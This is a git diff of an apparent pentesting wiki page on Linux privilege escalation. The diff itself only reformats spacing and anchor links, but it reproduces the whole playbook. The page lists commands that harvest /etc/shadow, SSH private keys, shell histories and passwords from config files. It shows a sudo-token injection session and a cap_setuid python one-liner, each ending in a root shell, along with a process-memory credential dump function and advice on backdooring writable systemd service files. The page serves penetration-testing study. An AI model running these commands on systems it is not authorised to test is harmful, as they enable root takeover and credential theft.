@@ -10,11 +10,11 @@ description: >-
 
 ### &#x20;distribution type and version
 
-#### `cat /etc/issue` ` cat /etc/*-release` ` cat /etc/lsb-release # Debian based` ` cat /etc/redhat-release # Redhat based`
+#### `cat /etc/issue`  `cat /etc/*-release`  `cat /etc/lsb-release # Debian based`  `cat /etc/redhat-release # Redhat based`
 
 ### kernel version
 
-#### `cat /proc/version` ` uname -a` ` uname -mrs` ` cat /proc/$$/status | grep "[UG]id"` ` rpm -q kernel` ` dmesg | grep Linux` ` ls /boot | grep vmlinuz-`
+#### `cat /proc/version`  `uname -a`  `uname -mrs`  `cat /proc/$$/status | grep "[UG]id"`  `rpm -q kernel`  `dmesg | grep Linux`  `ls /boot | grep vmlinuz-`
 
 ### places to find kernel exploits:
 
@@ -33,7 +33,7 @@ description: >-
 &#x20;[https://github.com/jondonas/linux-exploit-suggester-2](https://github.com/jondonas/linux-exploit-suggester-2)\
 &#x20;[http://www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)
 
-### Big UID <a href="big-uid" id="big-uid"></a>
+### Big UID <a href="#big-uid" id="big-uid"></a>
 
 Some Linux versions were affected by a bug that allow users with **UID > INT\_MAX** to escalate privileges. More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674). **Exploit it** using: **`systemd-run -t /bin/bash`**
 
@@ -43,7 +43,7 @@ Some Linux versions were affected by a bug that allow users with **UID > INT\_MA
 
 #### clone the repository and run the script: [sudo\_inject](https://github.com/nongiach/sudo\_inject)  requirements:
 
-#### `$ sudo whatever` ` [sudo] password for user:` ` # Press+c since you don't have the password.` ` # This creates an invalid sudo tokens.` ` $ sh exploit.sh` ` .... wait 1 seconds` ` $ sudo -i # no password required :)` ` # id` ` uid=0(root) gid=0(root) groups=0(root)`
+#### `$ sudo whatever`  `[sudo] password for user:`  `# Press+c since you don't have the password.`  `# This creates an invalid sudo tokens.`  `$ sh exploit.sh`  `.... wait 1 seconds`  `$ sudo -i # no password required :)`  `# id`  `uid=0(root) gid=0(root) groups=0(root)`
 
 #### for more methods related to sudo refer to [sudo abuse](https://7h3w4lk3r.gitbook.io/the-hive/network-attacks/untitled/privilege-escalation/sudo-abuse) section.
 
@@ -53,7 +53,7 @@ Some Linux versions were affected by a bug that allow users with **UID > INT\_MA
 
 see [environment variables section](https://7h3w4lk3r.gitbook.io/the-hive/network-attacks/untitled/privilege-escalation/environment-variables) for methods
 
-#### `cat /etc/profile` ` cat /home/*/.bashrc | grep alias | grep -v "#"` ` cat /root/.bashrc | grep alias | grep -v "#"` ` cat ~/.bash_profile` ` cat ~/.bashrc` ` cat ~/.bash_logout` ` env` ` set`
+#### `cat /etc/profile`  `cat /home/*/.bashrc | grep alias | grep -v "#"`  `cat /root/.bashrc | grep alias | grep -v "#"`  `cat ~/.bash_profile`  `cat ~/.bashrc`  `cat ~/.bash_logout`  `env`  `set`
 
 ### in-memory password
 
@@ -61,7 +61,7 @@ see [environment variables section](https://7h3w4lk3r.gitbook.io/the-hive/networ
 
 ### driver info
 
-#### `lsmod` ` /sbin/modinfo [lib]` ` ls /dev 2>/dev/null | grep -i "sd"` ` cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null` `` ` #Check if credentials in fstab` ` grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null`
+#### `lsmod`  `/sbin/modinfo [lib]`  `ls /dev 2>/dev/null | grep -i "sd"`  `cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null` ``  `#Check if credentials in fstab`  `grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null`
 
 ### available shells
 
@@ -81,11 +81,11 @@ see [environment variables section](https://7h3w4lk3r.gitbook.io/the-hive/networ
 
 ### &#x20;network connections/hosts
 
-#### &#x20;`lsof -i` ` lsof -i :80` ` grep 80 /etc/services` ` netstat -antup` ` netstat -antpx` ` netstat -tulpn` ` chkconfig --list` ` chkconfig --list | grep 3:on` ` last` ` w` ` cat /etc/sudoers`
+#### &#x20;`lsof -i`  `lsof -i :80`  `grep 80 /etc/services`  `netstat -antup`  `netstat -antpx`  `netstat -tulpn`  `chkconfig --list`  `chkconfig --list | grep 3:on`  `last`  `w`  `cat /etc/sudoers`
 
 ### &#x20;available file transfer methods
 
-#### &#x20;`find / -name wget` ` find / -name nc*` ` find / -name netcat*` ` find / -name tftp*` ` find / -name ftp`
+#### &#x20;`find / -name wget`  `find / -name nc*`  `find / -name netcat*`  `find / -name tftp*`  `find / -name ftp`
 
 
 
@@ -93,7 +93,7 @@ see [environment variables section](https://7h3w4lk3r.gitbook.io/the-hive/networ
 
 ### check for sudo access
 
-#### &#x20;`sudo -l |grep vim` ` sudo -l |grep nmap` ` sudo -l |grep vi` ` sudo -l`
+#### &#x20;`sudo -l |grep vim`  `sudo -l |grep nmap`  `sudo -l |grep vi`  `sudo -l`
 
 ### &#x20;users UID and GID
 
@@ -109,17 +109,17 @@ see [environment variables section](https://7h3w4lk3r.gitbook.io/the-hive/networ
 
 ### &#x20;check history
 
-#### &#x20;`cat ~/.bash_history` ` cat ~/.nano_history` ` cat ~/.atftp_history` ` cat ~/.mysql_history` ` cat ~/.php_history`
+#### &#x20;`cat ~/.bash_history`  `cat ~/.nano_history`  `cat ~/.atftp_history`  `cat ~/.mysql_history`  `cat ~/.php_history`
 
 ### &#x20;user info
 
-#### &#x20;`cat ~/.bashrc` ` cat ~/.profile` ` cat /var/mail/root` ` cat /var/spool/mail/root`
+#### &#x20;`cat ~/.bashrc`  `cat ~/.profile`  `cat /var/mail/root`  `cat /var/spool/mail/root`
 
 ## Possible defenses
 
 #### &#x20; AppArmor
 
-#### &#x20;``if [ `which aa-status 2>/dev/null` ]; then`` ` aa-status` `` elif [ `which apparmor_status 2>/dev/null` ]; then`` ` apparmor_status` `` elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then`` ` ls -d /etc/apparmor*` ` else` ` echo "Not found AppArmor"` ` fi`
+#### &#x20;``if [ `which aa-status 2>/dev/null` ]; then``  `aa-status`  ``elif [ `which apparmor_status 2>/dev/null` ]; then``  `apparmor_status`  ``elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then``  `ls -d /etc/apparmor*`  `else`  `echo "Not found AppArmor"`  `fi`
 
 #### &#x20;Grsecurity
 
@@ -133,17 +133,17 @@ see [environment variables section](https://7h3w4lk3r.gitbook.io/the-hive/networ
 
 #### &#x20;`(sestatus 2>/dev/null || echo "Not found sestatus")`   ASLR
 
-#### &#x20;`cat /proc/sys/kernel/randomize_va_space 2>/dev/null` ` #If 0, not enabled`
+#### &#x20;`cat /proc/sys/kernel/randomize_va_space 2>/dev/null`  `#If 0, not enabled`
 
 ## network
 
 ### network configurations
 
-#### &#x20;`cat /etc/resolv.conf` ` cat /etc/sysconfig/network` ` cat /etc/networks` ` iptables -L` ` hostname` ` dnsdomainname`
+#### &#x20;`cat /etc/resolv.conf`  `cat /etc/sysconfig/network`  `cat /etc/networks`  `iptables -L`  `hostname`  `dnsdomainname`
 
 ### &#x20;network status
 
-#### &#x20;`ss -anp` ` netstat -ano` ` /sbin/ifconfig -a` ` cat /etc/network/interfaces` ` cat /etc/sysconfig/network` ` arp -e` ` route` ` /sbin/route -nee`
+#### &#x20;`ss -anp`  `netstat -ano`  `/sbin/ifconfig -a`  `cat /etc/network/interfaces`  `cat /etc/sysconfig/network`  `arp -e`  `route`  `/sbin/route -nee`
 
 ### &#x20;try packet sniffing
 
@@ -151,7 +151,7 @@ see [environment variables section](https://7h3w4lk3r.gitbook.io/the-hive/networ
 
 ### &#x20;firewall rules
 
-#### &#x20;`/etc/iptables` ` iptables -L` ` grep -Hs iptables /etc/*`
+#### &#x20;`/etc/iptables`  `iptables -L`  `grep -Hs iptables /etc/*`
 
 ### &#x20;hosts and DNS&#x20;
 
@@ -175,25 +175,25 @@ process binaries paths and permissions
 
 ### find new running processes
 
-#### `#!/bin/bash` ` #Loop by line` ` IFS=$'\n'` ` old_process=$(ps aux --forest | grep -v "ps aux --forest" | grep -v "sleep 1" | grep -v $0)` ` while true; do` ` new_process=$(ps aux --forest | grep -v "ps aux --forest" | grep -v "sleep 1" | grep -v $0)` ` diff <(echo "$old_process") <(echo "$new_process") | grep [\<\>]` ` sleep 1` ` old_process=$new_process`
+#### `#!/bin/bash`  `#Loop by line`  `IFS=$'\n'`  `old_process=$(ps aux --forest | grep -v "ps aux --forest" | grep -v "sleep 1" | grep -v $0)`  `while true; do`  `new_process=$(ps aux --forest | grep -v "ps aux --forest" | grep -v "sleep 1" | grep -v $0)`  `diff <(echo "$old_process") <(echo "$new_process") | grep [\<\>]`  `sleep 1`  `old_process=$new_process`
 
 ### &#x20;check services and privileges&#x20;
 
-#### &#x20;`ps aux` ` ps -ef` ` ps aux | grep "^root"` ` top` ` cat /etc/services`
+#### &#x20;`ps aux`  `ps -ef`  `ps aux | grep "^root"`  `top`  `cat /etc/services`
 
 #### &#x20;Which service(s) are been running by root? Of these services, which are vulnerable - it's worth a double check!
 
-#### &#x20;`ps aux | grep root` ` ps -ef | grep root`
+#### &#x20;`ps aux | grep root`  `ps -ef | grep root`
 
 #### &#x20;What applications are installed? What version are they? Are they currently running?
 
-#### &#x20;`ls -alh /usr/bin/` ` ls -alh /sbin/` ` dpkg -l | grep` ` rpm -qa | grep` ` ls -alh /var/cache/apt/archives` ` ls -alh /var/cache/yum/`
+#### &#x20;`ls -alh /usr/bin/`  `ls -alh /sbin/`  `dpkg -l | grep`  `rpm -qa | grep`  `ls -alh /var/cache/apt/archives`  `ls -alh /var/cache/yum/`
 
 ### &#x20;scheduled Tasks
 
 see [cron/crontab abuse section](https://7h3w4lk3r.gitbook.io/the-hive/network-attacks/untitled/privilege-escalation/cron-crontab-abuse) for methods
 
-#### &#x20;`ls -lah /etc/cron*` ` cat /etc/crontab` ` crontab -l` ` ls -alh /var/spool/cron` ` ls -al /etc/ | grep cron` ` ls -al /etc/cron*` ` cat /etc/cron*` ` cat /etc/at.allow` ` cat /etc/at.deny` ` cat /etc/cron.allow` ` cat /etc/cron.deny` ` cat /etc/crontab` ` cat /etc/anacrontab` ` cat /var/spool/cron/crontabs/root`
+#### &#x20;`ls -lah /etc/cron*`  `cat /etc/crontab`  `crontab -l`  `ls -alh /var/spool/cron`  `ls -al /etc/ | grep cron`  `ls -al /etc/cron*`  `cat /etc/cron*`  `cat /etc/at.allow`  `cat /etc/at.deny`  `cat /etc/cron.allow`  `cat /etc/cron.deny`  `cat /etc/crontab`  `cat /etc/anacrontab`  `cat /var/spool/cron/crontabs/root`
 
 
 
@@ -204,7 +204,7 @@ see [cron/crontab abuse section](https://7h3w4lk3r.gitbook.io/the-hive/network-a
 
 ### **Process memory**
 
-#### &#x20;Some services of a server save credentials in clear text inside the memory.  Normally you will need root privileges to read the memory of processes that belong to other users, therefore this is usually more useful when you are already root and want to discover more credentials.  However, remember that as a regular user you can read the memory of the processes you own.   To dump a process memory you could use: [https://github.com/hajzer/bash-memory-dump](https://github.com/hajzer/bash-memory-dump)  You can manually remove root requirements and dump process owned by you   Script A.5 from [https://www.delaat.net/rp/2016-2017/p97/report.pdf](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root is required)  ** **
+#### &#x20;Some services of a server save credentials in clear text inside the memory.  Normally you will need root privileges to read the memory of processes that belong to other users, therefore this is usually more useful when you are already root and want to discover more credentials.  However, remember that as a regular user you can read the memory of the processes you own.   To dump a process memory you could use: [https://github.com/hajzer/bash-memory-dump](https://github.com/hajzer/bash-memory-dump)  You can manually remove root requirements and dump process owned by you   Script A.5 from [https://www.delaat.net/rp/2016-2017/p97/report.pdf](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root is required)   ****&#x20;
 
 ### &#x20;Process Memory Credentials
 
@@ -212,7 +212,7 @@ see [cron/crontab abuse section](https://7h3w4lk3r.gitbook.io/the-hive/network-a
 
 ### &#x20;**/proc/$pid/maps & /proc/$pid/mem**
 
-#### &#x20;For a given process ID, maps shows how memory is mapped within that processes' virtual address space; it also shows the permissions of each mapped region. The mem pseudo file exposes the processes memory itself. From the maps file we know which memory regions are readable and their offsets. We use this information to seek into the mem file and dump all readable regions to a file.    `procdump()` ` (` ` cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"` ` while read a b; do` ` dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \` ` skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"` ` done )` ` cat $1*.bin > $1.dump` ` rm $1*.bin` ` )`
+#### &#x20;For a given process ID, maps shows how memory is mapped within that processes' virtual address space; it also shows the permissions of each mapped region. The mem pseudo file exposes the processes memory itself. From the maps file we know which memory regions are readable and their offsets. We use this information to seek into the mem file and dump all readable regions to a file.    `procdump()`  `(`  `cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"`  `while read a b; do`  `dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \`  `skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"`  `done )`  `cat $1*.bin > $1.dump`  `rm $1*.bin`  `)`
 
 
 
@@ -234,29 +234,29 @@ see [cron/crontab abuse section](https://7h3w4lk3r.gitbook.io/the-hive/network-a
 
 ### &#x20;installed software/packages
 
-#### &#x20;`dpkg -l` ` rpm -q`
+#### &#x20;`dpkg -l`  `rpm -q`
 
 #### &#x20;
 
 #### service(s) settings misconfigured? Are any (vulnerable) plugins attached? 
 
-#### &#x20;`cat /etc/syslog.conf` ` cat /etc/chttp.conf` ` cat /etc/lighttpd.conf` ` cat /etc/cups/cupsd.conf` ` cat /etc/inetd.conf` ` cat /etc/apache2/apache2.conf` ` cat /etc/my.conf` ` cat /etc/httpd/conf/httpd.conf` ` cat /opt/lampp/etc/httpd.conf` ` ls -aRl /etc/ | awk '$1 ~ /^.*r.*/`
+#### &#x20;`cat /etc/syslog.conf`  `cat /etc/chttp.conf`  `cat /etc/lighttpd.conf`  `cat /etc/cups/cupsd.conf`  `cat /etc/inetd.conf`  `cat /etc/apache2/apache2.conf`  `cat /etc/my.conf`  `cat /etc/httpd/conf/httpd.conf`  `cat /opt/lampp/etc/httpd.conf`  `ls -aRl /etc/ | awk '$1 ~ /^.*r.*/`
 
 #### &#x20;Which configuration files can be written in /etc/? Able to reconfigure a service? 
 
-#### &#x20;`ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null # Anyone` ` ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null # Owner` ` ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null # Group` ` ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null # Other` ` find /etc/ -readable -type f 2>/dev/null # Anyone` ` find /etc/ -readable -type f -maxdepth 1 2>/dev/null # Anyone` ` ls -alh /var/log` ` ls -alh /var/mail` ` ls -alh /var/spool` ` ls -alh /var/spool/lpd` ` ls -alh /var/lib/pgsql` ` ls -alh /var/lib/mysql` ` cat /var/lib/dhcp3/dhclient.leases` ` ls -alhR /var/www/` ` ls -alhR /srv/www/htdocs/` ` ls -alhR /usr/local/www/apache22/data/` ` ls -alhR /opt/lampp/htdocs/` ` ls -alhR /var/www/html/`
+#### &#x20;`ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null # Anyone`  `ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null # Owner`  `ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null # Group`  `ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null # Other`  `find /etc/ -readable -type f 2>/dev/null # Anyone`  `find /etc/ -readable -type f -maxdepth 1 2>/dev/null # Anyone`  `ls -alh /var/log`  `ls -alh /var/mail`  `ls -alh /var/spool`  `ls -alh /var/spool/lpd`  `ls -alh /var/lib/pgsql`  `ls -alh /var/lib/mysql`  `cat /var/lib/dhcp3/dhclient.leases`  `ls -alhR /var/www/`  `ls -alhR /srv/www/htdocs/`  `ls -alhR /usr/local/www/apache22/data/`  `ls -alhR /opt/lampp/htdocs/`  `ls -alhR /var/www/html/`
 
-## Services <a href="services" id="services"></a>
+## Services <a href="#services" id="services"></a>
 
-### Writable _.service_ files <a href="writable-service-files" id="writable-service-files"></a>
+### Writable _.service_ files <a href="#writable-service-files" id="writable-service-files"></a>
 
 Check if you can write any `.service` file, if you can, you **could modify it** so it **executes** your **backdoor when** the service is **started**, **restarted** or **stopped** (maybe you will need to wait until the machine is rebooted). For example create your backdoor inside the .service file with **`ExecStart=/tmp/script.sh`**
 
-### Writable service binaries <a href="writable-service-binaries" id="writable-service-binaries"></a>
+### Writable service binaries <a href="#writable-service-binaries" id="writable-service-binaries"></a>
 
 Keep in mid that if you have **write permissions over binaries being executed by services**, you can change them for backdoors so when the services get re-executed the backdoors will be executed.
 
-### systemd PATH - Relative Paths <a href="systemd-path-relative-paths" id="systemd-path-relative-paths"></a>
+### systemd PATH - Relative Paths <a href="#systemd-path-relative-paths" id="systemd-path-relative-paths"></a>
 
 You can see the PATH used by **systemd** with:
 
@@ -296,7 +296,7 @@ Then, create a **executable** with the **same name as the relative path binary**
 
 ### &#x20;find SUID files
 
-#### &#x20;`find / -perm -u=s -type f 2>/dev/null` ` find / -perm -4000 -type f 2>/dev/null`
+#### &#x20;`find / -perm -u=s -type f 2>/dev/null`  `find / -perm -4000 -type f 2>/dev/null`
 
 ### &#x20;Find SUID files owned by root
 
@@ -312,11 +312,11 @@ Then, create a **executable** with the **same name as the relative path binary**
 
 ### &#x20;List all conf files in /etc/
 
-#### &#x20;`ls -al /etc/*.conf` ` grep pass* /etc/*.conf >>> containing passwords`
+#### &#x20;`ls -al /etc/*.conf`  `grep pass* /etc/*.conf >>> containing passwords`
 
 ### conf files with “pass\*” string
 
-#### `grep pass* /etc/*.conf` ` grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null` ` find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;`
+#### `grep pass* /etc/*.conf`  `grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null`  `find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;`
 
 ### &#x20;list of open files
 
@@ -332,7 +332,7 @@ Then, create a **executable** with the **same name as the relative path binary**
 
 ### &#x20;mount volumes
 
-#### &#x20;`cat /etc/fstab` ` mount` ` /bin/lsblk`
+#### &#x20;`cat /etc/fstab`  `mount`  `/bin/lsblk`
 
 ### &#x20;search for SUID set
 
@@ -340,15 +340,15 @@ Then, create a **executable** with the **same name as the relative path binary**
 
 ### &#x20;plain text usernames/passwords
 
-#### `grep -i user [filename]` ` grep -i pass [filename]` ` grep -C 5 "password" [filename]` ` find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password" # Joomla`
+#### `grep -i user [filename]`  `grep -i pass [filename]`  `grep -C 5 "password" [filename]`  `find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password" # Joomla`
 
 #### &#x20;What sensitive files can be found? 
 
-#### &#x20;`cat /etc/passwd` ` cat /etc/group` ` cat /etc/shadow` ` ls -alh /var/mail/`
+#### &#x20;`cat /etc/passwd`  `cat /etc/group`  `cat /etc/shadow`  `ls -alh /var/mail/`
 
 ### &#x20;ssh key info 
 
-#### &#x20;`cat ~/.ssh/authorized_keys` ` cat ~/.ssh/identity.pub` ` cat ~/.ssh/identity` ` cat ~/.ssh/id_rsa.pub` ` cat ~/.ssh/id_rsa` ` cat ~/.ssh/id_dsa.pub` ` cat ~/.ssh/id_dsa` ` cat /etc/ssh/ssh_config` ` cat /etc/ssh/sshd_config` ` cat /etc/ssh/ssh_host_dsa_key.pub` ` cat /etc/ssh/ssh_host_dsa_key` ` cat /etc/ssh/ssh_host_rsa_key.pub` ` cat /etc/ssh/ssh_host_rsa_key` ` cat /etc/ssh/ssh_host_key.pub` ` cat /etc/ssh/ssh_host_key`
+#### &#x20;`cat ~/.ssh/authorized_keys`  `cat ~/.ssh/identity.pub`  `cat ~/.ssh/identity`  `cat ~/.ssh/id_rsa.pub`  `cat ~/.ssh/id_rsa`  `cat ~/.ssh/id_dsa.pub`  `cat ~/.ssh/id_dsa`  `cat /etc/ssh/ssh_config`  `cat /etc/ssh/sshd_config`  `cat /etc/ssh/ssh_host_dsa_key.pub`  `cat /etc/ssh/ssh_host_dsa_key`  `cat /etc/ssh/ssh_host_rsa_key.pub`  `cat /etc/ssh/ssh_host_rsa_key`  `cat /etc/ssh/ssh_host_key.pub`  `cat /etc/ssh/ssh_host_key`
 
 SSH Key Predictable PRNG (Authorized\_Keys) Process\
 
@@ -360,15 +360,15 @@ SSH Key Predictable PRNG (Authorized\_Keys) Process\
 
 #### &#x20;2. Since this is an ssh-dss key, we need to add that to our local copy of /etc/ssh/ssh\_config and /etc/ssh/sshd\_config: 
 
-#### &#x20;`echo "PubkeyAcceptedKeyTypes=+ssh-dss" >> /etc/ssh/ssh_config` ` echo "PubkeyAcceptedKeyTypes=+ssh-dss" >> /etc/ssh/sshs_config` ` /etc/init.d/ssh restart` ``
+#### &#x20;`echo "PubkeyAcceptedKeyTypes=+ssh-dss" >> /etc/ssh/ssh_config`  `echo "PubkeyAcceptedKeyTypes=+ssh-dss" >> /etc/ssh/sshs_config`  `/etc/init.d/ssh restart` ``
 
 #### &#x20; Get [g0tmi1k's debian-ssh repository](https://github.com/g0tmi1k/debian-ssh) and unpack the keys:
 
-#### &#x20;`git clone https://github.com/g0tmi1k/debian-ssh` ` cd debian-ssh` `` ` tar vjxf common_keys/debian_ssh_dsa_1024_x86.tar.bz2` ``
+#### &#x20;`git clone https://github.com/g0tmi1k/debian-ssh`  `cd debian-ssh` ``  `tar vjxf common_keys/debian_ssh_dsa_1024_x86.tar.bz2` ``
 
 #### &#x20;3. Grab the first 20 or 30 bytes from the key file shown above starting with the "AAAA..." portion and grep the unpacked keys with it as: 
 
-#### &#x20;`grep -lr 'AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf'` ` dsa/1024/68b329da9893e34099c7d8ad5cb9c940-17934.pub` `` ``
+#### &#x20;`grep -lr 'AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf'`  `dsa/1024/68b329da9893e34099c7d8ad5cb9c940-17934.pub` `` ``
 
 #### &#x20;5. IF SUCCESSFUL, this will return a file (68b329da9893e34099c7d8ad5cb9c940-17934.pub) public file. To use the private key file to connect, drop the '.pub' extension and do: 
 
@@ -380,7 +380,7 @@ log files\
 
 
 
-#### &#x20;`cat /etc/httpd/logs/access_log` ` cat /etc/httpd/logs/access.log` ` cat /etc/httpd/logs/error_log` ` cat /etc/httpd/logs/error.log` ` cat /var/log/apache2/access_log` ` cat /var/log/apache2/access.log` ` cat /var/log/apache2/error_log` ` cat /var/log/apache2/error.log` ` cat /var/log/apache/access_log` ` cat /var/log/apache/access.log` ` cat /var/log/auth.log` ` cat /var/log/chttp.log`
+#### &#x20;`cat /etc/httpd/logs/access_log`  `cat /etc/httpd/logs/access.log`  `cat /etc/httpd/logs/error_log`  `cat /etc/httpd/logs/error.log`  `cat /var/log/apache2/access_log`  `cat /var/log/apache2/access.log`  `cat /var/log/apache2/error_log`  `cat /var/log/apache2/error.log`  `cat /var/log/apache/access_log`  `cat /var/log/apache/access.log`  `cat /var/log/auth.log`  `cat /var/log/chttp.log`
 
 Capabilities\
 
@@ -392,19 +392,19 @@ Capabilities\
 
 #### &#x20;Edit capabilities 
 
-#### &#x20;`/usr/bin/setcap -r /bin/ping # remove` ` /usr/bin/setcap cap_net_raw+p /bin/ping # add`
+#### &#x20;`/usr/bin/setcap -r /bin/ping # remove`  `/usr/bin/setcap cap_net_raw+p /bin/ping # add`
 
 #### &#x20;Interesting capabilities  Having the capability =ep means the binary has all the capabilities. 
 
-#### &#x20;`$ getcap openssl /usr/bin/openssl` ` openssl=ep`
+#### &#x20;`$ getcap openssl /usr/bin/openssl`  `openssl=ep`
 
 #### &#x20;Alternatively the following capabilities can be used in order to upgrade your current privileges. 
 
-#### &#x20;`cap_dac_read_search # read anything` ` cap_setuid+ep # setuid`
+#### &#x20;`cap_dac_read_search # read anything`  `cap_setuid+ep # setuid`
 
 #### &#x20;Example of privilege escalation with cap\_setuid+ep 
 
-#### &#x20;`sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7` ` python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'` ` sh-5.0# id` ` uid=0(root) gid=1000(swissky)` `>`
+#### &#x20;`sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7`  `python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'`  `sh-5.0# id`  `uid=0(root) gid=1000(swissky)` `>`
 
 ![](../../../.gitbook/assets/capabilities1.png)
 
